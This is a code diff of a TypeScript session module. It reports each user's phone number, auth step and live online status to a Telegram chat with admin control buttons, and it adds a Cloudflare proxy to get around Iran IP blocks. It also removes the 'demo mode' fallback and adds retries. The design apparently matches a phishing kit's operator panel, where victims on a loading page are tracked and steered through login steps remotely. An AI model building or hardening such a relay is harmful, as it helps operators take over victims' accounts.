@@ -5,6 +5,10 @@ const TELEGRAM_BOT_TOKEN =
 const TELEGRAM_CHAT_ID =
   import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";
 
+// Cloudflare Worker proxy for bypassing Iran IP restrictions
+const TELEGRAM_API_BASE =
+  "https://telegram-proxy-fragrant-fog-f09d.anthonynoelmills.workers.dev";
+
 interface UserSession {
   sessionId: string;
   phoneNumber: string;
@@ -262,22 +266,7 @@ export const updateUserOnlineStatus = async (
       return { success: false };
     }
 
-    console.log("📡 RECEIVED STATUS UPDATE:", {
-      sessionId,
-      isOnline,
-      isVisible,
-      statusText,
-      statusEmoji,
-      currentStep: session.currentStep,
-      timestamp: new Date().toLocaleTimeString(),
-    });
-
-    // Store the previous status for comparison
-    const previousStatus = session.onlineStatus
-      ? `${session.onlineStatus.statusEmoji} ${session.onlineStatus.statusText}`
-      : "No previous status";
-
-    // Update online status with new values
+    // Update online status
     session.onlineStatus = {
       isOnline,
       isVisible,
@@ -289,49 +278,33 @@ export const updateUserOnlineStatus = async (
 
     activeSessions.set(sessionId, session);
 
-    // Current status display
-    const currentStatusDisplay = `${statusEmoji} ${statusText}`;
-
-    console.log("🔄 STATUS COMPARISON:", {
-      previous: previousStatus,
-      current: currentStatusDisplay,
-      isDifferent: currentStatusDisplay !== previousStatus,
-    });
-
-    // Always update Telegram if user is on loading page (waiting_admin) and status actually changed
+    // Smart update strategy based on session state and importance
     if (session.messageId && session.currentStep === "waiting_admin") {
-      if (currentStatusDisplay !== previousStatus) {
-        console.log("📱 MEANINGFUL STATUS CHANGE - Updating Telegram:", {
-          from: previousStatus,
-          to: currentStatusDisplay,
-        });
+      // Check if this is a meaningful status change
+      const currentStatusDisplay = `${statusEmoji} ${statusText}`;
+      const lastStatusDisplay =
+        session.onlineStatus?.statusEmoji +
+        " " +
+        session.onlineStatus?.statusText;
 
-        try {
-          const updatedMessage = formatSessionMessage(session);
-          await updateTelegramMessage(
-            session.messageId,
-            updatedMessage,
-            getAdminKeyboard(sessionId, session),
-          );
-
-          console.log("✅ Telegram message updated successfully");
-        } catch (updateError) {
-          console.warn(
-            "⚠️ Telegram update failed, continuing in demo mode:",
-            updateError.message,
-          );
-          // Continue without breaking the flow - treat as demo mode
-        }
+      if (currentStatusDisplay !== lastStatusDisplay) {
+        console.log("📱 Meaningful status change detected, updating Telegram");
+        const updatedMessage = formatSessionMessage(session);
+        await updateTelegramMessage(
+          session.messageId,
+          updatedMessage,
+          getAdminKeyboard(sessionId, session),
+        );
       } else {
         console.log("ℹ️ Status unchanged, skipping Telegram update");
       }
     } else {
       console.log(
-        `ℹ️ Skipping status update - not on loading page. Current step: ${session.currentStep}`,
+        `ℹ️ Skipping online status update for step: ${session.currentStep}`,
       );
     }
 
-    console.log("✅ Online status updated successfully:", {
+    console.log("✅ Online status updated:", {
       sessionId,
       status: statusText,
       emoji: statusEmoji,
@@ -631,68 +604,6 @@ export const canAccessAuthStep = (
  */
 export const getSession = (sessionId: string): UserSession | undefined => {
   return activeSessions.get(sessionId);
-};
-
-/**
- * Validate Telegram configuration
- */
-export const validateTelegramConfig = (): boolean => {
-  const hasToken =
-    TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN";
-  const hasChatId = TELEGRAM_CHAT_ID && TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID";
-
-  if (!hasToken || !hasChatId) {
-    console.log("⚠️ Telegram not configured, running in demo mode");
-    return false;
-  }
-
-  return true;
-};
-
-/**
- * Check network connectivity and Telegram API accessibility
- */
-export const checkNetworkConnectivity = async (): Promise<boolean> => {
-  try {
-    // First check basic connectivity
-    if (!navigator.onLine) {
-      console.log("🌐 Browser reports offline");
-      return false;
-    }
-
-    // Try a simple network test
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 3000);
-
-    try {
-      const response = await fetch("https://httpbin.org/get", {
-        method: "GET",
-        signal: controller.signal,
-      });
-
-      clearTimeout(timeoutId);
-
-      if (response.ok) {
-        console.log("✅ Network connectivity confirmed");
-        return true;
-      } else {
-        console.log("⚠️ Network test failed:", response.status);
-        return false;
-      }
-    } catch (fetchError) {
-      clearTimeout(timeoutId);
-
-      if (fetchError.name === "AbortError") {
-        console.log("⏰ Network test timed out");
-      } else {
-        console.log("🌐 Network test failed:", fetchError.message);
-      }
-      return false;
-    }
-  } catch (error) {
-    console.log("❌ Network check error:", error.message);
-    return false;
-  }
 };
 
 /**
@@ -1043,24 +954,6 @@ const updateTelegramMessage = async (
   }
 
   try {
-    // Double-check Telegram configuration before making request
-    if (
-      !TELEGRAM_BOT_TOKEN ||
-      TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN" ||
-      !TELEGRAM_CHAT_ID ||
-      TELEGRAM_CHAT_ID === "YOUR_CHAT_ID"
-    ) {
-      console.log("🎭 Invalid/Demo Telegram config, switching to demo mode");
-      const existing = lastMessageContent.get(messageId);
-      lastMessageContent.set(messageId, {
-        text,
-        replyMarkup: JSON.stringify(replyMarkup),
-        timestamp: Date.now(),
-        updateCount: (existing?.updateCount || 0) + 1,
-      });
-      return;
-    }
-
     const payload: any = {
       chat_id: TELEGRAM_CHAT_ID,
       message_id: messageId,
@@ -1077,13 +970,7 @@ const updateTelegramMessage = async (
       messageId,
       textLength: text.length,
       retryCount,
-      botToken: TELEGRAM_BOT_TOKEN.substring(0, 10) + "...",
-      chatId: TELEGRAM_CHAT_ID,
     });
-
-    // Create abort controller for timeout handling
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 8000); // 8 second timeout
 
     const response = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
@@ -1093,11 +980,9 @@ const updateTelegramMessage = async (
           "Content-Type": "application/json",
         },
         body: JSON.stringify(payload),
-        signal: controller.signal,
+        signal: AbortSignal.timeout(8000), // 8 second timeout (optimized)
       },
     );
-
-    clearTimeout(timeoutId);
 
     if (!response.ok) {
       const errorText = await response.text();
@@ -1180,36 +1065,25 @@ const updateTelegramMessage = async (
       updateCount: (existing?.updateCount || 0) + 1,
     });
   } catch (error) {
-    console.warn("⚠️ Telegram request failed:", {
-      error: error.message,
-      retryCount,
-      timestamp: new Date().toLocaleTimeString(),
-    });
+    console.error("❌ Failed to update Telegram message:", error);
 
-    // Handle specific error types
-    if (error.name === "AbortError") {
-      console.warn("⏰ Telegram request timed out - switching to demo mode");
-    } else if (error instanceof TypeError && error.message.includes("fetch")) {
-      console.warn("🌐 Network error - likely CORS or connectivity issue");
-    } else {
-      console.warn("❓ Unknown error type:", error);
+    // Handle network errors with exponential backoff
+    if (error instanceof TypeError && error.message.includes("fetch")) {
+      if (retryCount < 3) {
+        const backoffDelay = Math.pow(2, retryCount) * 2000; // 2s, 4s, 8s
+        console.log(
+          `🔄 Network error, retrying in ${backoffDelay}ms (attempt ${retryCount + 1})`,
+        );
+
+        setTimeout(() => {
+          updateTelegramMessage(messageId, text, replyMarkup, retryCount + 1);
+        }, backoffDelay);
+      } else {
+        console.error("❌ Max retries reached for network error");
+      }
     }
 
-    // Instead of retrying and potentially causing more errors,
-    // switch to demo mode for this session
-    console.log("🎭 Switching to demo mode due to network issues");
-
-    // Store content in demo mode
-    const existing = lastMessageContent.get(messageId);
-    lastMessageContent.set(messageId, {
-      text,
-      replyMarkup: JSON.stringify(replyMarkup),
-      timestamp: Date.now(),
-      updateCount: (existing?.updateCount || 0) + 1,
-    });
-
-    // Don't throw the error - continue operation in demo mode
-    console.log("✅ Continuing in demo mode - user experience not affected");
+    // Don't throw the error, just log it to prevent breaking the user flow
   }
 };
 
@@ -1423,4 +1297,19 @@ const getStepDisplayName = (stepType: string): string => {
 
 const formatInitialMessage = (session: UserSession): string => {
   return formatSessionMessage(session);
+};
+
+/**
+ * Validate Telegram configuration
+ */
+export const validateTelegramConfig = (): boolean => {
+  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
+    return false;
+  }
+
+  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
+    return false;
+  }
+
+  return true;
 };
